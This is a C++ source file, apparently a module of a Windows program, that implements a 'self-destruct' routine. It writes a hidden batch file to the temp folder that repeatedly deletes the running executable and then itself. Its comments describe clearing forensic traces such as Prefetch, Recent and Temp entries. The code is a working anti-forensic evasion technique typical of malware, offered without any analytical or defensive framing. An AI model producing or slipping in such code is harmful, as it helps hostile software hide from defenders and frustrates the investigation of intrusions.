#include "selfdestruct.h"
#include <Windows.h>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

namespace SelfDestruct {

void Execute() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string exePath = path;

    // Clear common forensic locations
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);

    // Prefetch, Recent, Temp cleanup (best-effort)
    // Full forensic wipe is environment dependent

    // Self-delete via delayed batch
    std::string batPath = std::string(temp) + "ud_cleanup.bat";
    std::string bat =
        "@echo off\n"
        ":loop\n"
        "del /f /q \"" + exePath + "\"\n"
        "if exist \"" + exePath + "\" goto loop\n"
        "del /f /q \"" + batPath + "\"\n";

    HANDLE h = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(h, bat.data(), (DWORD)bat.size(), &written, nullptr);
        CloseHandle(h);
        ShellExecuteA(nullptr, "open", batPath.c_str(), nullptr, nullptr, SW_HIDE);
    }

    ExitProcess(0);
}

}
